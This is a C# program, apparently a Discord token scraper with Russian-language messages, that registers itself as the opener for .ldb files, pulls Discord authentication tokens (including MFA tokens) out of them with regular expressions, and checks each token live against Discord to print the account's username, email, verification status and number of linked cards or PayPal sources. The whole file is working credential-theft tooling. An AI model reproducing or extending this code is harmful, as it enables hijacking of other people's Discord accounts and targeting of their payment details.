using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using LDBTokenParser.Association;
using LDBTokenParser.Checker;

namespace LDBTokenParser
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                var association = FileAssociations.SetAssociation(".ldb", "LdbTokenScrapper", "Discord LDB File",
                    Path.Combine(Directory.GetCurrentDirectory(), Process.GetCurrentProcess().ProcessName + ".exe"));
                Console.WriteLine(association
                    ? "Формат файла .ldb был зарегистрирован как нужно."
                    : "Похоже что этот тип файла уже зарегестрирован в системе... Просто нажми на 2 раза на LDB файл что бы его открыть через эту программу, или же запусти меня от имени администратора...");

                Console.ReadLine();
                Environment.Exit(0);
            }

            var data = File.ReadAllText(args[0]);
            var matches = Regex.Matches(data, @"(mfa\.[\w_\-]{84})|([\w]{24}\.[\w_\-]{6}\.[\w_\-]{27})");
            switch (matches.Count)
            {
                case 0:
                    Console.WriteLine("В этом файле нет токенов.");
                    Console.ReadLine();
                    break;
                default:
                {
                    foreach (var match in matches)
                    {
                  
                        if (matches.Count <= 10)
                        {
                            var response = TokenChecker.CheckToken(match.ToString()).GetAwaiter().GetResult(); // Остановите синхронизацию 
                            if (!response.Valid)
                            {
                                Console.WriteLine($"Токен {match} невалидный.");
                                continue;
                            }
                            
                            Console.WriteLine("Информация о токене: \n" +
                                              $"Ник и тэг: {response.Me.Username}#{response.Me.Discriminator}\n" +
                                              $"Email: {response.Me.Email} ({(response.Me.Verified ? "" : "Не ")}Верифицирована)\n" +
                                              $"Привязаные карты/PayPal: {response.PaymentSources.Count}\n" +
                                              $"=============================================");
                            
                        }
                        else
                        {
                            Console.WriteLine($"Найден токен: {match}");
                        }
                    }

                    break;
                }
            }
            Console.WriteLine("Ну это все.");
            Console.ReadLine();
        }
    }
}